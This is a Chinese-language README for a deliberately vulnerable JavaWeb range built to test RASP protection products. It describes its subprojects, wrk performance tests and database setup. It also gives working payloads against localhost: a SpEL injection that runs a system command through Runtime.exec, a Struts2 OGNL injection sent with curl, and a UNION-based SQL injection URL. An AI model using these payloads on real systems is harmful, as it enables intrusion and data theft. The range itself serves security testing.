# JavaWeb RASP漏洞测试环境



## 1. 项目说明

1. RASP漏洞测试环境主要包含了两个项目:`rasp-test-springboot`和`rasp-test-struts2`，它们使用了相同的源代码分别用于测试`SpringBoot`和`Struts2`漏洞；
2. `rasp-test-core`包含了基于SpringMVC实现的所有的测试用例接口；
3. `rasp-test-jakarta-servlet`和`rasp-test-servlet`用于测试Java EE的兼容性；
4. `rasp-test-shiro`用户测试shiro漏洞；



启动`rasp-test-struts2`之后能够看到一个RASP测试导航：

<img src="images/image-20210803164543721.png" alt="image-20210803164543721" style="zoom:50%;" />

项目内置了用于性能测试的两个接口`org.javaweb.vuls.controller.IndexController.getUserByName/getSysUserByName`一个采用了传统的GET/POST传参，另一个采用了JSON方式传参：

<img src="images/image-20210803165139192.png" alt="image-20210803165139192" style="zoom:50%;" />

测试参数如下：

```bash
wrk -t200 -c500 -d30s --latency "http://localhost:8000/getUserByName.do?username=admin" 
```

JSON接口测试：

```bash
wrk -t200 -c500 -d30s --script=/Users/yz/user.lua --latency "http://localhost:8000/getSysUserByName.do" 
```

**user.lua：**

```lua
wrk.method = 'POST' 
wrk.headers['Content-Type'] = 'application/json'  
wrk.body = '{"username": "admin"}' 
```

除此之外，为了便于测试Web漏洞，在`rasp-test-struts2/src/main/webapp/modules`目录根据漏洞类型写了非常多的示例。



## 2. 靶场配置

靶场采用了Sqlite和Mysql两种数据库，如果您想安装数据库可以使用Sqlite进行测试，如果选用Mysql测试需要先创建：`javaweb-bbs`数据库，并导出项目根目录的`javaweb-bbs.sql`文件，然后修改`rasp-test-struts2/src/main/resources/config/jdbc.properties`或`rasp-test-springboot/src/main/resources/application.properties`配置文件中的数据库账号密码。



## 3. SpringBoot SpEL表达式注入

`rasp-test-springboot`使用的是`SpringBoot 1.3.0`，这个版本存在`SpEL表达式注入`漏洞，访问的控制器地址是`getUserById.do?id=1`，参数`id`存在`SpEL表达式注入`漏洞，发送如下`Payload`服务器会返回`SpEL表达式`的计算结果：
![](./images/1588767427746.jpg)

通过SpEL表达式可以执行系统命令，如:`http://localhost:8000/getUserById.do?id=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100)))}`。



## 4. Struts2 OGNL表达式注入

`rasp-test-struts2`使用的是`Struts2 2.1.8`版本存在`Struts2`命令执行漏洞，访问的`action`是`rasp.action`可以使用`Struts2`的`Payload`进行检测，例如发送如下`Payload`服务器会返回`[/ok]`:

```
redirect:${%23w%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23w.println('[/ok]'),%23w.flush(),%23w.close()}
```

如使用`curl`发送`Payload`：

```
curl -i http://localhost:8000/rasp.action -d "redirect:%24%7b%23w%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23w.println('[/ok]'),%23w.flush(),%23w.close()%7d"
```
或者使用浏览器访问(需要注意的是Tomcat8+不能使用URL传参):`http://localhost:8000/rasp.action?redirect:%24%7b%23w%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27).getWriter(),%23w.println(%27[/ok]%27),%23w.flush(),%23w.close()%7d`

![](./images/1588764042020.jpg)



## 5. SQL注入

几乎所有可以传参的地方都存在SQL注入，例如获取文章详情页中的`articleId`参数存在注入，如使用算数符获取ID为10000的文章(`articleId=100001-1`)：
<img src="./images/1588767982847.jpg" style="zoom:67%;" />

注入数据库信息：
`http://localhost:8000/getArticle.do?articleId=100001%20and%201=2%20union%20select%201,2,user(),4,version(),null,7`
<img src="./images/1588820291794.jpg" style="zoom:50%;" />

需要注意的是因为数据库查询的时候有一个字段是`private Date publishDate;`所以注入的时候需要注意数据字段类型，上述`union select`注入示例使用了`null`占位。



## 6. 其他测试用例

`rasp-test-core`项目中的`org.javaweb.vuls.controller`包下面包含了非常多的其他测试用例。